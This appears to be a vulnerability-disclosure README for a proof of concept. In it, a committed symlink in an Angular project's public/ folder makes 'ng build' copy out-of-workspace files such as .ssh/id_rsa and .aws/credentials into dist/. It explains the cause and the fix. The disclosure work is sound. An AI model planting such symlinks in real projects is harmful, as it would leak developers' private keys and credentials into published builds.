# Angular CLI symlink asset escape

Minimal reproduction for `@angular/build` 22.2.0 using the application builder.

`ng build` copies assets into the build output after checking that every asset path stays inside the workspace root. The check is lexical and the globber follows symbolic links by default, so a link committed inside `public/` makes the builder read through it and copy files from outside the project into `dist/`.

Everything here is placeholder data under `/tmp`. Nothing real is read or written.

## Cause

`resolve-assets.ts` validates the path and then passes the option straight to the globber:

```ts
if (!isSubDirectory(root, entry.input)) {
  throw new Error(`The ${entry.input} asset path must be within the workspace root.`);
}

const files = await glob(entry.glob, {
  cwd: path.resolve(root, entry.input),
  followSymbolicLinks: entry.followSymlinks,
});
```

`schema.json` declares `"followSymlinks": { "default": false }`, but the schema registry builds Ajv without `useDefaults`, so the default is never written into the options object. `entry.followSymlinks` arrives as `undefined`, and `tinyglobby` treats `undefined` as `true`:

```text
followSymbolicLinks: undefined  ->  [ 'link/secret.txt' ]
followSymbolicLinks: false      ->  [ ]
followSymbolicLinks: true       ->  [ 'link/secret.txt' ]
```

`isSubDirectory()` resolves both operands with `resolve()` and compares them with `relative()`, never `realpath`. A symlink therefore resolves inside the workspace root, passes the check, and is then used as the globber `cwd`.

## Run

Requires Node `^22.22.3 || ^24.15.0 || >=26`.

```bash
npm install --ignore-scripts
./setup-poc.sh
./verify-poc.sh
```

`setup-poc.sh` creates the placeholder home at `/tmp/ng-poc-victim-home` and the symlink. `verify-poc.sh` installs with `--ignore-scripts`, builds, and reports what landed in `dist/`.

Expected output:

```text
==> Files in the build output:
dist/poc-app/browser/docs/.aws/credentials
dist/poc-app/browser/docs/.npmrc
dist/poc-app/browser/docs/.ssh/id_rsa
dist/poc-app/browser/index.html
dist/poc-app/browser/main-LXC4EHWO.js

RESULT: VULNERABLE — files outside the workspace root were copied into dist/.
```

Setting the documented default stops it:

```bash
# angular.json -> assets: [{ "glob": "**/*", "input": "public", "followSymlinks": false }]
npx ng build && find dist -name '.npmrc'
```

## Payload

`angular.json` is unmodified. The config `ng new` generates already globs the whole directory:

```json
"assets": [{ "glob": "**/*", "input": "public" }]
```

So the payload is one symlink, stored as an ordinary git object:

```text
$ git ls-files -s public/docs
120000 18256e9dd691e092afe104dedec10ea2160c7469 0  public/docs
```

It survives `clone`, and nothing is executed during the build, so `npm ci --ignore-scripts` does not change the outcome.

The direct form is blocked, which is what shows the check is meant to hold:

```text
assets: [{ "glob": "**/*", "input": "../../../secretstuff" }]
An unhandled exception occurred: The ../../../secretstuff asset path must be within the workspace root.
```
